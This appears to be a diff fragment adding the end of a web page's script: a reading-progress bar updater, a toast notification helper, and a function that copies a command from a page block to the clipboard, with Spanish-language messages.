+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
